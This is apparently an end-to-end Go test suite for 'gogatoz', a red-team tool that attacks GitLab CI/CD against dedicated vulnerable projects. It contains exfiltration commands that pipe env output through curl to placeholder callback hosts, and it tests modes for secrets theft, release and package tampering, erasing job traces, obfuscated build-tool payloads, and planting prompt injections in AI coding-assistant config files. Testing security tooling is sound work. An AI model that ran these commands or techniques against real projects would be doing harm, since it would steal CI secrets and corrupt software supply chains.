//go:build e2e

package e2e_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// ----- Non-mutative tests -----

func TestAttack_DiscoverTags_Text(t *testing.T) {
	tok := requireCreds(t)
	stdout, stderr, err := runGogatoz(t, tok, "attack", "--target", testVulnProject, "--discover-tags")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("discover-tags (text) failed: %v\nstderr: %s", err, stderr)
	}
	// Output is comma-separated tags or empty — just verify it didn't error.
	t.Logf("discover-tags text output: %s", strings.TrimSpace(stdout))
}

func TestAttack_DiscoverTags_JSON(t *testing.T) {
	tok := requireCreds(t)
	stdout, stderr, err := runGogatoz(t, tok, "attack", "--target", testVulnProject, "--discover-tags", "--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("discover-tags --json failed: %v\nstderr: %s", err, stderr)
	}

	var tags []string
	if err := json.Unmarshal([]byte(stdout), &tags); err != nil {
		t.Fatalf("unmarshal tags JSON: %v\nraw: %s", err, stdout)
	}
	t.Logf("discovered %d tags", len(tags))
}

func TestAttack_PayloadOnly_RORShell(t *testing.T) {
	// No creds needed — payload-only is local rendering.
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "ror-shell", "--cmd", "id", "--tags", "docker")
	if err != nil {
		t.Fatalf("payload-only ror-shell failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "script:") && !strings.Contains(stdout, "id") {
		t.Errorf("expected ror-shell YAML with 'id' command; got:\n%s", stdout)
	}
}

func TestAttack_PayloadOnly_PwnRequest(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "pwn-request", "--target-branch-regex", "main")
	if err != nil {
		t.Fatalf("payload-only pwn-request failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "main") {
		t.Errorf("expected pwn-request YAML referencing 'main'; got:\n%s", stdout)
	}
}

func TestAttack_PayloadOnly_SecretsExfil(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "secrets", "--webhook", "https://example.com")
	if err != nil {
		t.Fatalf("payload-only secrets failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "https://example.com") {
		t.Errorf("expected secrets YAML with webhook URL; got:\n%s", stdout)
	}
}

func TestAttack_PayloadOnly_RunnerOnRunner(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "runner-on-runner", "--script-url", "https://example.com/s.sh", "--tags", "docker")
	if err != nil {
		t.Fatalf("payload-only runner-on-runner failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "https://example.com/s.sh") {
		t.Errorf("expected runner-on-runner YAML with script URL; got:\n%s", stdout)
	}
}

func TestAttack_PayloadOnly_GitHook(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "git-hook", "--webhook", "https://example.com/callback", "--tags", "shell")
	if err != nil {
		t.Fatalf("payload-only git-hook failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "HOOK_B64") {
		t.Errorf("expected git-hook YAML with HOOK_B64; got:\n%s", stdout)
	}
	if !strings.Contains(stdout, "base64") {
		t.Errorf("expected git-hook YAML with base64 decode; got:\n%s", stdout)
	}
}

func TestAttack_PayloadOnly_CachePoison(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack", "--payload-only", "--payload", "cache-poison", "--cache-key", "shared-deps", "--tags", "shell")
	if err != nil {
		t.Fatalf("payload-only cache-poison failed: %v\nstderr: %s", err, stderr)
	}

	if !strings.Contains(stdout, "shared-deps") {
		t.Errorf("expected cache-poison YAML with cache key; got:\n%s", stdout)
	}
	if !strings.Contains(stdout, "cache:") || !strings.Contains(stdout, "push") {
		t.Errorf("expected cache-poison YAML with push policy; got:\n%s", stdout)
	}
}

// ----- Mutative tests -----

func TestAttack_CommitCI_And_Cleanup(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	// Register cleanup BEFORE creating the branch.
	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", testVulnProject,
			"--cleanup", "--cleanup-branch", branch)
	})

	// Safe CI YAML that never executes jobs.
	safeCI := "stages:\n  - test\nnoop:\n  stage: test\n  script: [\"echo noop\"]\n  rules:\n    - when: never\n"

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("commit-ci failed: %v\nstderr: %s", err, stderr)
	}

	var commitResult map[string]any
	if err := json.Unmarshal([]byte(stdout), &commitResult); err != nil {
		t.Fatalf("unmarshal commit-ci JSON: %v\nraw: %s", err, stdout)
	}

	if _, ok := commitResult["pipeline_url"]; !ok {
		t.Error("expected pipeline_url in commit-ci JSON output")
	}
	if b, ok := commitResult["branch"].(string); !ok || b != branch {
		t.Errorf("expected branch=%s; got %v", branch, commitResult["branch"])
	}

	// Verify cleanup works via the gogatoz cleanup command.
	cleanStdout, cleanStderr, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--cleanup", "--cleanup-branch", branch, "--json")
	if err != nil {
		t.Fatalf("cleanup failed: %v\nstderr: %s", err, cleanStderr)
	}

	var cleanResult map[string]any
	if err := json.Unmarshal([]byte(cleanStdout), &cleanResult); err != nil {
		t.Fatalf("unmarshal cleanup JSON: %v\nraw: %s", err, cleanStdout)
	}

	actions, ok := cleanResult["actions"].([]any)
	if !ok || len(actions) == 0 {
		t.Error("expected cleanup actions in JSON output")
	}
}

func TestAttack_DeconflictSuffix(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	// Track all branches we create for cleanup.
	var createdBranches []string
	t.Cleanup(func() {
		for _, b := range createdBranches {
			_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
				"attack", "--target", testVulnProject,
				"--cleanup", "--cleanup-branch", b)
		}
	})

	safeCI := "stages:\n  - test\nnoop:\n  stage: test\n  script: [\"echo noop\"]\n  rules:\n    - when: never\n"

	// First commit — should use the exact branch name.
	stdout1, stderr1, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "suffix",
		"--json")
	skipOnInsufficientScope(t, err, stderr1)
	if err != nil {
		t.Fatalf("first commit-ci failed: %v\nstderr: %s", err, stderr1)
	}
	var res1 map[string]any
	if err := json.Unmarshal([]byte(stdout1), &res1); err != nil {
		t.Fatalf("unmarshal first commit: %v", err)
	}
	b1, _ := res1["branch"].(string)
	if b1 == "" {
		t.Fatal("first commit returned empty branch")
	}
	createdBranches = append(createdBranches, b1)

	// Second commit — should get suffix -1.
	stdout2, stderr2, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "suffix",
		"--json")
	if err != nil {
		t.Fatalf("second commit-ci failed: %v\nstderr: %s", err, stderr2)
	}
	var res2 map[string]any
	if err := json.Unmarshal([]byte(stdout2), &res2); err != nil {
		t.Fatalf("unmarshal second commit: %v", err)
	}
	b2, _ := res2["branch"].(string)
	if b2 == "" {
		t.Fatal("second commit returned empty branch")
	}
	createdBranches = append(createdBranches, b2)

	if b1 == b2 {
		t.Errorf("suffix deconflict should produce different branch names; got %s both times", b1)
	}
	if !strings.HasPrefix(b2, branch) {
		t.Errorf("suffixed branch should start with %s; got %s", branch, b2)
	}
}

func TestAttack_DeconflictFail_RejectsExisting(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", testVulnProject,
			"--cleanup", "--cleanup-branch", branch)
	})

	safeCI := "stages:\n  - test\nnoop:\n  stage: test\n  script: [\"echo noop\"]\n  rules:\n    - when: never\n"

	// First commit should succeed.
	_, stderr1, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr1)
	if err != nil {
		t.Fatalf("first commit-ci failed: %v\nstderr: %s", err, stderr1)
	}

	// Second commit with --deconflict fail should error.
	_, _, err = runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	if err == nil {
		t.Error("expected error on second commit with --deconflict fail; got nil")
	}
}

func TestAttack_Secrets_ProjectVars(t *testing.T) {
	tok := requireCreds(t)
	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--secrets", "--project-vars", "--json",
		"--branch", e2eBranchName(t),
		"--tags", testRunnerTag)
	if err != nil {
		// Secrets mode may fail if runner not available — skip gracefully.
		t.Skipf("secrets --project-vars failed (runner may be unavailable): %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal secrets JSON: %v\nraw: %s", err, stdout)
	}

	if _, ok := result["pipeline_url"]; !ok {
		t.Error("expected pipeline_url in secrets JSON output")
	}
}

func TestAttack_MissingToken_Error(t *testing.T) {
	// Don't call requireCreds — we intentionally omit the token.
	_, _, err := runGogatoz(t, "",
		"attack", "--target", testVulnProject,
		"--commit-ci", "--ci-yaml", "test: {script: [echo]}",
		"--deconflict", "fail")
	if err == nil {
		t.Error("expected error when token is missing; got nil")
	}
}

func TestAttack_Secrets_ExtractsMySecret(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		unprotectBranch(t, tok, testVulnProject, branch)
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", testVulnProject,
			"--cleanup", "--cleanup-branch", branch)
	})

	// Pre-protect the branch so the push-triggered pipeline has access to
	// protected variables like MY_SECRET. GitLab allows protecting branch
	// names that don't exist yet — the rule activates when the branch is created.
	protectBranch(t, tok, testVulnProject, branch)

	// Phase 1: Run secrets exfiltration — commits CI that dumps env to artifact,
	// and lists project variables via API.
	stdout, stderr, err := runGogatozWithTimeout(t, tok, 120*time.Second,
		"attack", "--target", testVulnProject,
		"--secrets", "--project-vars", "--include-protected",
		"--json", "--branch", branch,
		"--tags", testRunnerTag)
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("secrets --project-vars failed: %v\nstderr: %s", err, stderr)
	}

	var result struct {
		PipelineURL      string `json:"pipeline_url"`
		ProjectVariables []struct {
			Key       string `json:"key"`
			Value     string `json:"value"`
			Masked    bool   `json:"masked"`
			Protected bool   `json:"protected"`
		} `json:"project_variables"`
	}
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal secrets JSON: %v\nraw: %s", err, stdout)
	}

	if result.PipelineURL == "" {
		t.Error("expected non-empty pipeline_url")
	}

	// Verify MY_SECRET key is found via API (value is hidden by GitLab for masked vars).
	foundKey := false
	for _, v := range result.ProjectVariables {
		if v.Key == "MY_SECRET" {
			foundKey = true
			if !v.Masked {
				t.Error("expected MY_SECRET to be masked")
			}
			if !v.Protected {
				t.Error("expected MY_SECRET to be protected")
			}
			break
		}
	}
	if !foundKey {
		t.Errorf("expected MY_SECRET in project_variables; got keys: %v", func() []string {
			var keys []string
			for _, v := range result.ProjectVariables {
				keys = append(keys, v.Key)
			}
			return keys
		}())
	}

	// Phase 2: Wait for the secrets pipeline to complete.
	status := waitForPipeline(t, tok, testVulnProject, branch, 120*time.Second)
	if status != "success" {
		t.Fatalf("secrets pipeline finished with status %q; expected success", status)
	}

	// Phase 3: Download the env.txt artifact and verify MY_SECRET value.
	envTxt := downloadJobArtifact(t, tok, testVulnProject, branch, "env.txt", "exfiltrate")
	if envTxt == "" {
		t.Fatal("env.txt artifact is empty")
	}

	const expectedValue = "FLAG{this_is_the_top_secret_flag}"
	found := false
	for _, line := range strings.Split(envTxt, "\n") {
		if strings.HasPrefix(line, "MY_SECRET=") {
			actual := strings.TrimPrefix(line, "MY_SECRET=")
			if actual == expectedValue {
				found = true
			} else {
				t.Errorf("MY_SECRET value mismatch: got %q, want %q", actual, expectedValue)
			}
			break
		}
	}
	if !found {
		t.Error("MY_SECRET not found in env.txt artifact")
		t.Logf("env.txt contents:\n%s", envTxt)
	}
}

func TestAttack_MissingTarget_Error(t *testing.T) {
	// Use a dummy token but no --target.
	loadTestEnv(t)
	tok := strings.TrimSpace(os.Getenv("TEST_API_PAT"))
	if tok == "" {
		tok = "dummy-token-for-validation"
	}
	_, _, err := runGogatozWithTimeout(t, tok, 10*time.Second,
		"attack",
		"--commit-ci", "--ci-yaml", "test: {script: [echo]}")
	if err == nil {
		t.Error("expected error when --target is missing; got nil")
	}
}

// ── Dedicated vuln-attack-* repo tests ──

func TestAttack_Secrets_ExfilFromDedicatedRepo(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		unprotectBranch(t, tok, vulnAttackSecrets, branch)
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAttackSecrets,
			"--cleanup", "--cleanup-branch", branch)
	})

	protectBranch(t, tok, vulnAttackSecrets, branch)

	stdout, stderr, err := runGogatozWithTimeout(t, tok, 120*time.Second,
		"attack", "--target", vulnAttackSecrets,
		"--secrets", "--project-vars", "--include-protected",
		"--json", "--branch", branch,
		"--tags", testRunnerTag)
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("secrets exfil from dedicated repo failed: %v\nstderr: %s", err, stderr)
	}

	var result struct {
		PipelineURL      string `json:"pipeline_url"`
		ProjectVariables []struct {
			Key       string `json:"key"`
			Protected bool   `json:"protected"`
			Masked    bool   `json:"masked"`
		} `json:"project_variables"`
	}
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal secrets JSON: %v\nraw: %s", err, stdout)
	}

	if result.PipelineURL == "" {
		t.Error("expected non-empty pipeline_url")
	}

	foundKey := false
	for _, v := range result.ProjectVariables {
		if v.Key == "EXFIL_SECRET" {
			foundKey = true
			if !v.Masked {
				t.Error("expected EXFIL_SECRET to be masked")
			}
			if !v.Protected {
				t.Error("expected EXFIL_SECRET to be protected")
			}
			break
		}
	}
	if !foundKey {
		t.Error("expected EXFIL_SECRET in project_variables from vuln-attack-secrets")
	}
}

func TestAttack_PushCI_DedicatedTarget(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAttackPushCI,
			"--cleanup", "--cleanup-branch", branch)
	})

	safeCI := "stages:\n  - test\nnoop:\n  stage: test\n  script: [\"echo noop\"]\n  rules:\n    - when: never\n"

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackPushCI,
		"--commit-ci", "--ci-yaml", safeCI,
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("push-ci to dedicated repo failed: %v\nstderr: %s", err, stderr)
	}

	var commitResult map[string]any
	if err := json.Unmarshal([]byte(stdout), &commitResult); err != nil {
		t.Fatalf("unmarshal commit-ci JSON: %v\nraw: %s", err, stdout)
	}

	if _, ok := commitResult["pipeline_url"]; !ok {
		t.Error("expected pipeline_url in commit-ci JSON output")
	}
	if b, ok := commitResult["branch"].(string); !ok || b != branch {
		t.Errorf("expected branch=%s; got %v", branch, commitResult["branch"])
	}
}

func TestAttack_DiscoverTags_DedicatedROR(t *testing.T) {
	tok := requireCreds(t)
	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackROR,
		"--discover-tags", "--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("discover-tags on dedicated ror repo failed: %v\nstderr: %s", err, stderr)
	}

	var tags []string
	if err := json.Unmarshal([]byte(stdout), &tags); err != nil {
		t.Fatalf("unmarshal tags JSON: %v\nraw: %s", err, stdout)
	}
	t.Logf("discovered %d tags on %s", len(tags), vulnAttackROR)
}

// ----- AI Inject tests -----

func TestAttack_AIInject_CommitAndCleanup(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAttackAIInject,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackAIInject,
		"--ai-inject",
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("ai-inject failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal ai-inject JSON: %v\nraw: %s", err, stdout)
	}

	if b, ok := result["branch"].(string); !ok || b != branch {
		t.Errorf("expected branch=%s; got %v", branch, result["branch"])
	}
	if cf, ok := result["config_file"].(string); !ok || cf != "CLAUDE.md" {
		t.Errorf("expected config_file=CLAUDE.md; got %v", result["config_file"])
	}
}

func TestAttack_AIInject_CustomConfigFile(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAttackAIInject,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackAIInject,
		"--ai-inject",
		"--ai-config-file", ".cursorrules",
		"--ai-prompt", "Malicious prompt content for testing",
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("ai-inject custom config failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}

	if cf, ok := result["config_file"].(string); !ok || cf != ".cursorrules" {
		t.Errorf("expected config_file=.cursorrules; got %v", result["config_file"])
	}
}

func TestAttack_AIInject_WithMR(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAttackAIInject,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackAIInject,
		"--ai-inject",
		"--create-mr",
		"--mr-title", "docs: update project config",
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("ai-inject with MR failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}

	if mrURL, ok := result["merge_request_url"].(string); !ok || mrURL == "" {
		t.Error("expected non-empty merge_request_url in ai-inject MR output")
	}
}

// ── New attack mode tests ──

func TestAttack_InjectScript(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnScriptInjection,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnScriptInjection,
		"--inject-script",
		"--script-path", "scripts/deploy.sh",
		"--script-payload", "echo INJECTED",
		"--branch", branch,
		"--deconflict", "fail",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("inject-script failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	if b, ok := result["branch"].(string); !ok || b == "" {
		t.Error("expected non-empty branch in inject-script output")
	}
}

func TestAttack_TamperRelease(t *testing.T) {
	tok := requireCreds(t)

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackTamper,
		"--tamper-release",
		"--tag-name", "v1.0.0",
		"--release-name", "Tampered Release",
		"--add-link-name", "Backdoored Binary",
		"--add-link-url", "https://example.com/malicious",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("tamper-release failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	// Verify the link was added
	if added, ok := result["links_added"].(float64); !ok || added < 1 {
		t.Errorf("expected at least 1 link added, got: %v", result["links_added"])
	}
}

func TestAttack_TamperPackage(t *testing.T) {
	tok := requireCreds(t)

	// Create a temp file to upload
	tmpFile := filepath.Join(t.TempDir(), "malicious.tar.gz")
	if err := os.WriteFile(tmpFile, []byte("malicious content"), 0o600); err != nil {
		t.Fatalf("write temp file: %v", err)
	}

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAttackTamper,
		"--tamper-package",
		"--package-name", "test-pkg",
		"--package-version", "99.0.0",
		"--package-file", tmpFile,
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("tamper-package failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	if pkg, ok := result["package_name"].(string); !ok || pkg != "test-pkg" {
		t.Errorf("expected package_name=test-pkg, got: %v", result["package_name"])
	}
}

func TestAttack_AutoMerge(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		_, _, _ = runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnAutoMerge,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnAutoMerge,
		"--auto-merge",
		"--ci-yaml", "stages:\n  - test\ntest:\n  stage: test\n  script: [echo ok]\n  tags: [shell_executor]",
		"--branch", branch,
		"--deconflict", "fail",
		"--mr-title", "chore: e2e auto-merge test",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("auto-merge failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	if mrURL, ok := result["merge_request_url"].(string); !ok || mrURL == "" {
		t.Error("expected non-empty merge_request_url in auto-merge output")
	}
}

func TestAttack_CleanupPipeline(t *testing.T) {
	tok := requireCreds(t)

	// Use cleanup-jobs with max 1 on a project that has pipelines
	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", testVulnProject,
		"--cleanup",
		"--cleanup-jobs",
		"--cleanup-jobs-max", "1",
		"--json")
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("cleanup-jobs failed: %v\nstderr: %s", err, stderr)
	}

	// Just verify it returns valid JSON (job trace erasure may or may not find traces)
	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
}

// ----- LOTP payload-only tests (no credentials needed) -----

func TestAttack_PayloadOnly_LOTP_GYP(t *testing.T) {
	// Phantom Gyp technique: binding.gyp + index.js
	stdout, stderr, err := runGogatoz(t, "", "attack",
		"--payload-only", "--payload", "lotp-gyp",
		"--cmd", "printenv | curl -sd @- https://cb.example.com",
	)
	if err != nil {
		t.Fatalf("payload-only lotp-gyp failed: %v\nstderr: %s", err, stderr)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
		t.Fatalf("lotp-gyp output is not valid JSON: %v\nraw: %s", err, stdout)
	}
	if out["tool"] != "npm-gyp" {
		t.Errorf("tool=%v want npm-gyp", out["tool"])
	}
	files, _ := out["files"].([]any)
	if len(files) != 2 {
		t.Fatalf("expected 2 files (binding.gyp + index.js), got %d", len(files))
	}
	paths := make(map[string]string)
	for _, f := range files {
		fm := f.(map[string]any)
		paths[fm["path"].(string)] = fm["content"].(string)
	}
	if _, ok := paths["binding.gyp"]; !ok {
		t.Error("expected binding.gyp in output files")
	}
	if _, ok := paths["index.js"]; !ok {
		t.Error("expected index.js in output files")
	}
	if !strings.Contains(paths["binding.gyp"], "<!(node index.js") {
		t.Error("binding.gyp should contain gyp command substitution")
	}
	// Command must be base64-encoded in index.js (not plaintext)
	if strings.Contains(paths["index.js"], "printenv") {
		t.Error("index.js must not contain the plaintext command — should be base64-encoded")
	}
	if !strings.Contains(paths["index.js"], "Buffer.from") {
		t.Error("index.js should decode base64 via Buffer.from")
	}
}

func TestAttack_PayloadOnly_LOTP_Make(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack",
		"--payload-only", "--payload", "lotp-make",
		"--cmd", "id",
	)
	if err != nil {
		t.Fatalf("payload-only lotp-make failed: %v\nstderr: %s", err, stderr)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
		t.Fatalf("lotp-make output is not valid JSON: %v\nraw: %s", err, stdout)
	}
	files, _ := out["files"].([]any)
	if len(files) != 1 {
		t.Fatalf("expected 1 file (Makefile), got %d", len(files))
	}
	fm := files[0].(map[string]any)
	if fm["path"] != "Makefile" {
		t.Errorf("path=%v want Makefile", fm["path"])
	}
	if !strings.Contains(fm["content"].(string), "$(shell") {
		t.Error("Makefile should use $(shell ...) expansion")
	}
}

func TestAttack_PayloadOnly_LOTP_Pytest(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack",
		"--payload-only", "--payload", "lotp-pytest",
		"--cmd", "whoami",
	)
	if err != nil {
		t.Fatalf("payload-only lotp-pytest failed: %v\nstderr: %s", err, stderr)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
		t.Fatalf("lotp-pytest output is not valid JSON: %v\nraw: %s", err, stdout)
	}
	files, _ := out["files"].([]any)
	if len(files) != 1 {
		t.Fatalf("expected 1 file (conftest.py), got %d", len(files))
	}
	fm := files[0].(map[string]any)
	if fm["path"] != "conftest.py" {
		t.Errorf("path=%v want conftest.py", fm["path"])
	}
}

func TestAttack_PayloadOnly_LOTP_Terraform(t *testing.T) {
	stdout, stderr, err := runGogatoz(t, "", "attack",
		"--payload-only", "--payload", "lotp-terraform",
		"--cmd", "env | curl -sd @- https://callback.example.com",
	)
	if err != nil {
		t.Fatalf("payload-only lotp-terraform failed: %v\nstderr: %s", err, stderr)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
		t.Fatalf("lotp-terraform output is not valid JSON: %v\nraw: %s", err, stdout)
	}
	files, _ := out["files"].([]any)
	if len(files) != 1 {
		t.Fatalf("expected 1 file (main.tf), got %d", len(files))
	}
	if files[0].(map[string]any)["path"] != "main.tf" {
		t.Error("expected main.tf")
	}
}

// ----- LOTP inject tests (require credentials + target) -----

func TestAttack_LOTPInject_GYP(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnLOTPGYP,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnLOTPGYP,
		"--lotp-inject", "--lotp-tool", "npm-gyp",
		"--cmd", "printenv | head -5",
		"--branch", branch,
		"--deconflict", "fail",
		"--json",
	)
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("lotp-inject gyp failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	if result["branch"].(string) == "" {
		t.Error("expected non-empty branch in output")
	}
	if result["tool"] != "npm-gyp" {
		t.Errorf("tool=%v want npm-gyp", result["tool"])
	}
	files, _ := result["files_committed"].([]any)
	if len(files) != 2 {
		t.Errorf("expected 2 committed files (binding.gyp + index.js), got %d", len(files))
	}
}

func TestAttack_LOTPInject_Make(t *testing.T) {
	tok := requireCreds(t)
	branch := e2eBranchName(t)

	t.Cleanup(func() {
		runGogatozWithTimeout(t, tok, 30*time.Second,
			"attack", "--target", vulnLOTPNpm,
			"--cleanup", "--cleanup-branch", branch)
	})

	stdout, stderr, err := runGogatoz(t, tok,
		"attack", "--target", vulnLOTPNpm,
		"--lotp-inject", "--lotp-tool", "make",
		"--cmd", "id",
		"--branch", branch,
		"--deconflict", "fail",
		"--json",
	)
	skipOnInsufficientScope(t, err, stderr)
	if err != nil {
		t.Fatalf("lotp-inject make failed: %v\nstderr: %s", err, stderr)
	}

	var result map[string]any
	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
	}
	if b, ok := result["branch"].(string); !ok || b == "" {
		t.Error("expected non-empty branch")
	}
	files, _ := result["files_committed"].([]any)
	if len(files) != 1 {
		t.Errorf("expected 1 committed file (Makefile), got %d", len(files))
	}
}

